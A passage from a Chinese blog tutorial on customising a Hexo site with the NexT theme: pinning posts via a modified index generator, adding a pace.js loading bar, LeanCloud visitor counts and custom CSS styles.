title="博文置顶"></a>博文置顶</h3><blockquote><p>修改 <code>hero-generator-index</code>插件，把文件：<code>node_modules/hexo-generator-index/lib/generator.js</code>内的代码替换为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">'hexo-pagination'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="keyword">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts;</span><br><span class="line">    posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123; <span class="comment">// 两篇文章top都有定义</span></span><br><span class="line">            <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date; <span class="comment">// 若top值一样则按照文章日期降序排</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top; <span class="comment">// 否则按照top值降序排</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123; <span class="comment">// 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233）</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date; <span class="comment">// 都没定义按照文章日期降序排</span></span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">'page'</span>;</span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">''</span>, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">'index'</span>, <span class="string">'archive'</span>],</span><br><span class="line">    format: paginationDir + <span class="string">'/%d/'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>在文章中添加 top 值，数值越大文章越靠前，如:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">......</span><br><span class="line">copyright: <span class="literal">true</span></span><br><span class="line">top: <span class="number">100</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>默认不设置则为0，数值相同时按时间排序。</p></blockquote><h3 id="添加顶部加载条"><a href="#添加顶部加载条" class="headerlink" title="添加顶部加载条"></a>添加顶部加载条</h3><blockquote><p>打开<code>/themes/next/layout/_partials/head.swig</code>文件，在maximum-scale=1”/&gt;后添加如下代码:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn.bootcss.com/pace/1.0.2/pace.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>但是，默认的是粉色的，要改变颜色可以在<code>/themes/next/layout/_partials/head.swig</code>文件中添加如下代码（接在刚才link的后面）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">style</span>&gt;</span><br><span class="line">    <span class="selector-class">.pace</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">        <span class="attribute">background</span>: <span class="number">#1E92FB</span>; <span class="comment">/*进度条颜色*/</span></span><br><span class="line">        <span class="attribute">height</span>: <span class="number">3px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.pace</span> <span class="selector-class">.pace-progress-inner</span> &#123;</span><br><span class="line">         <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">#1E92FB</span>, <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span>     <span class="number">#1E92FB</span>; <span class="comment">/*阴影颜色*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.pace</span> <span class="selector-class">.pace-activity</span> &#123;</span><br><span class="line">        <span class="attribute">border-top-color</span>: <span class="number">#1E92FB</span>;    <span class="comment">/*上边框颜色*/</span></span><br><span class="line">        <span class="attribute">border-left-color</span>: <span class="number">#1E92FB</span>;    <span class="comment">/*左边框颜色*/</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="添加热度"><a href="#添加热度" class="headerlink" title="添加热度"></a>添加热度</h3><blockquote><p>next主题集成leanCloud，打开<code>/themes/next/layout/_macro/post.swig</code>，在”leancloud-visitors-count”&gt;标签后面添加℃。<br>然后打开，<code>/themes/next/languages/zh-Hans.yml</code>，将visitors内容改为_热度_即可。<br>注： 在<strong>主题</strong>配置文件中检查leancolud的值是否设置为true，<code>app_id</code>和<code>app_key</code>需要去<a href="https://leancloud.cn" target="_blank" rel="noopener">leancolud</a> 注册，然后创建应用获取。如图:<img src="http://p5m1dtoh7.bkt.clouddn.com/Hexo_Hithub_blog/leancolud_id_key.png" alt=""></p></blockquote><h3 id="添加到样式文件"><a href="#添加到样式文件" class="headerlink" title="添加到样式文件"></a>添加到样式文件</h3><blockquote><p>打开<code>themes/next/source/css/_custom/custom.styl</code>，把调试好的样式加进去，保存后<code>Ctrl+F5</code>就能看到效果了，前提是在本地运行的，下面引用了一下别人的一些样式：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">// Custom styles.  </span><br><span class="line">// 页面头部背景  </span><br><span class="line"><span class="selector-class">.header</span> &#123;  <span class="attribute">background</span>:<span class="built_in">url</span>([http://ojoba1c98.bkt.clouddn.com/img/header/header_background.jpg](http://ojoba1c98.bkt.clouddn.com/img/header/header_background.jpg));&#125;</span><br><span class="line">// 子标题  </span><br><span class="line"><span class="selector-class">.site-subtitle</span>&#123; <span class="attribute">font-size</span>: <span class="number">15px</span>; <span class="attribute">color</span>: white; &#125;   </span><br><span class="line">// 标题  </span><br><span class="line"><span class="selector-class">.site-title</span> &#123;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">font-weight</span>: bold;  </span><br><span class="line">&#125; </span><br><span class="line">// 标题背景  </span><br><span class="line"><span class="selector-class">.brand</span>&#123;  </span><br><span class="line"> <span class="attribute">background</span>: transparent;  </span><br><span class="line">&#125; </span><br><span class="line">// 菜单栏  </span><br><span class="line"><span class="selector-class">.menu</span> &#123;  </span><br><span class="line"> <span class="attribute">margin-top</span>: <span class="number">20px</span>;  </span><br><span class="line"> <span class="attribute">padding-left</span>: <span class="number">0</span>;  </span><br><span class="line"> <span class="attribute">text-align</span>: center;  </span><br><span class="line"> <span class="attribute">background</span>: <span class="built_in">rgba</span>(240, 240, 240, 0.5);  </span><br><span class="line"> <span class="attribute">margin-left</span>: auto;  </span><br><span class="line"> <span class="attribute">margin-right</span>: auto;  </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">530px</span>;  </span><br><span class="line"> <span class="attribute">border-radius</span>: initial;  </span><br><span class="line">&#125;</span><br><span class="line">// 菜单图表链接 以及 超链接样式  </span><br><span class="line"><span class="selector-tag">a</span> &#123;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="built_in">rgba</span>(0,0,0,0.8);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#ff106c</span>;  </span><br><span class="line"> <span class="attribute">border-bottom-color</span>: <span class="number">#ff106c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 菜单字体大小  </span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span> &#123;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">14px</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;  </span><br><span class="line"> <span class="attribute">border-bottom-color</span>: <span class="number">#ff106c</span>;  </span><br><span class="line">&#125;</span><br><span class="line">// 文章背景框框  </span><br><span class="line"><span class="selector-class">.post</span> &#123;  </span><br><span class="line"> <span class="attribute">margin-top</span>: <span class="number">10px</span>;  </span><br><span class="line"> <span class="attribute">margin-bottom</span>: <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">18px</span>;  </span><br><span class="line"> <span class="attribute">-webkit-box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">rgba</span>(202, 203, 203, 0.8);  </span><br><span class="line"> &#125;</span><br><span class="line">// 站点描述  </span><br><span class="line"><span class="selector-class">.site-description</span> &#123;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">16px</span>;   </span><br><span class="line">&#125; </span><br><span class="line">// 头部inner  </span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;  </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">45px</span> <span class="number">0</span> <span class="number">25px</span>;  </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">700px</span>;  </span><br><span class="line">&#125; </span><br><span class="line">// 作者名  </span><br><span class="line"><span class="selector-class">.site-author-name</span> &#123;  </span><br><span class="line"> <span class="attribute">font-family</span>: <span class="string">'Comic Sans MS'</span>, sans-serif;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">20px</span>;  </span><br><span class="line">&#125; </span><br><span class="line">// 文章之间的分割线  </span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-eof</span> &#123;  </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">40px</span> auto <span class="number">40px</span>;  </span><br><span class="line"> <span class="attribute">background</span>: white;  </span><br><span class="line">&#125; </span><br><span class="line">// 按钮样式  </span><br><span class="line"><span class="selector-class">.btn</span> &#123;  </span><br><span class="line"> <span class="attribute">margin-top</span>: <span class="number">20px</span>;  </span><br><span class="line">&#125; </span><br><span class="line">// ``代码块样式  </span><br><span class="line"><span class="selector-tag">code</span> &#123;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#E6006B</span>;  </span><br><span class="line"> <span class="attribute">background</span>: white;  </span><br><span class="line"> <span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">body</span> &#123;  </span><br><span class="line"> <span class="attribute">color</span>: <span class="number">#444</span>;  </span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">16px</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><h3 id="好玩的样式"><a href="#好玩的样式" class="headerlink" title="好玩的样式"></a>好玩的样式</h3><blockquote><p>先在<code>themes/next/source/css/_custom/custom.styl</code>中添加以下样式：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line">// 下载样式  </span><br><span class="line"><span class="selector-tag">a</span><span class="selector-id">#download</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: inline-block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">color</span>: <span class="number">#000</span>;  </span><br><span class="line"><span class="attribute">background</span>: transparent;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#000</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">2px</span>;  </span><br><span class="line"><span class="attribute">transition</span>: all .<span class="number">5s</span> ease;  </span><br><span class="line"><span class="attribute">font-weight</span>: bold;  </span><br><span class="line">&amp;:hover &#123;  </span><br><span class="line"><span class="selector-tag">background</span>: <span class="selector-id">#000</span>;  </span><br><span class="line"><span class="selector-tag">color</span>: <span class="selector-id">#fff</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">/ /颜色块-黄  </span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#inline-yellow</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>:inline;  </span><br><span class="line"><span class="attribute">padding</span>:.<span class="number">2em</span> .<span class="number">6em</span> .<span class="number">3em</span>;  </span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">80%</span>;  </span><br><span class="line"><span class="attribute">font-weight</span>:bold;  </span><br><span class="line"><span class="attribute">line-height</span>:<span class="number">1</span>;  </span><br><span class="line"><span class="attribute">color</span>:<span class="number">#fff</span>;  </span><br><span class="line"><span class="attribute">text-align</span>:center;  </span><br><span class="line"><span class="attribute">white-space</span>:nowrap;  </span><br><span class="line"><span class="attribute">vertical-align</span>:baseline;  </span><br><span class="line"><span class="attribute">border-radius</span>:<span class="number">0</span>;  </span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#f0ad4e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 颜色块-绿  </span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#inline-green</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>:inline;  </span><br><span class="line"><span class="attribute">padding</span>:.<span class="number">2em</span> .<span class="number">6em</span> .<span class="number">3em</span>;  </span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">80%</span>;  </span><br><span class="line"><span class="attribute">font-weight</span>:bold;  </span><br><span class="line"><span class="attribute">line-height</span>:<span class="number">1</span>;  </span><br><span class="line"><span class="attribute">color</span>:<span class="number">#fff</span>;  </span><br><span class="line"><span class="attribute">text-align</span>:center;  </span><br><span class="line"><span class="attribute">white-space</span>:nowrap;  </span><br><span class="line"><span class="attribute">vertical-align</span>:baseline;  </span><br><span class="line"><span class="attribute">border-radius</span>:<span class="number">0</span>;  </span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#5cb85c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 颜色块-蓝  </span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#inline-blue</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>:inline;  </span><br><span class="line"><span class="attribute">padding</span>:.<span class="number">2em</span> .<span class="number">6em</span> .<span class="number">3em</span>;  </span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">80%</span>;  </span><br><span class="line"><span class="attribute">font-weight</span>:bold;  </span><br><span class="line"><span class="attribute">line-height</span>:<span class="number">1</span>;  </span><br><span class="line"><span class="attribute">color</span>:<span class="number">#fff</span>;  </span><br><span class="line"><span class="attribute">text-align</span>:center;  </span><br><span class="line"><span class="attribute">white-space</span>:nowrap;  </span><br><span class="line"><span class="attribute">vertical-align</span>:baseline;  </span><br><span class="line"><span class="attribute">border-radius</span>:<span class="number">0</span>;  </span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#2780e3</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 颜色块-紫  </span><br><span class="line"><span class="selector-tag">span</span><span class="selector-id">#inline-purple</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>:inline;  </span><br><span class="line"><span class="attribute">padding</span>:.<span class="number">2em</span> .<span class="number">6em</span> .<span class="number">3em</span>;  </span><br><span class="line"><span class="attribute">font-size</span>:<span class="number">80%</span>;  </span><br><span class="line"><span class="attribute">font-weight</span>:bold;  </span><br><span class="line"><span class="attribute">line-height</span>:<span class="number">1</span>;  </span><br><span class="line"><span class="attribute">color</span>:<span class="number">#fff</span>;  </span><br><span class="line"><span class="attribute">text-align</span>:center;  </span><br><span class="line"><span class="attribute">white-space</span>:nowrap;  </span><br><span class="line"><span class="attribute">vertical-align</span>:baseline;  </span><br><span class="line"><span class="attribute">border-radius</span>:<span class="number">0</span>;  </span><br><span class="line"><span class="attribute">background-color</span>: <span class="number">#9954bb</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 左侧边框红色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-left-red</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-left-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-left-color</span>: <span class="number">#df3e3e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 左侧边框黄色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-left-yellow</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-left-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-left-color</span>: <span class="number">#f0ad4e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 左侧边框绿色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-left-green</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-left-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-left-color</span>: <span class="number">#5cb85c</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 左侧边框蓝色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-left-blue</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-left-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-left-color</span>: <span class="number">#2780e3</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 左侧边框紫色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-left-purple</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-left-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-left-color</span>: <span class="number">#9954bb</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 右侧边框红色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-right-red</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-right-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-right-color</span>: <span class="number">#df3e3e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 右侧边框黄色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-right-yellow</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;  </span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;  </span><br><span class="line"><span class="attribute">border-right-width</span>: <span class="number">5px</span>;  </span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">3px</span>;  </span><br><span class="line"><span class="attribute">border-right-color</span>: <span class="number">#f0ad4e</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">// 右侧边框绿色块级  </span><br><span class="line"><span class="selector-tag">p</span><span class="selector-id">#div-border-right-green</span> &#123;  </span><br><span class="line"><span class="attribute">display</span>: block;  </span><br><span class="line"><span class="attribute">padding</span>: <span class="number">10px</span>;  </span><br><span class="line"><span class="attribute">margin</span>: <span class="number">10px</span> <span 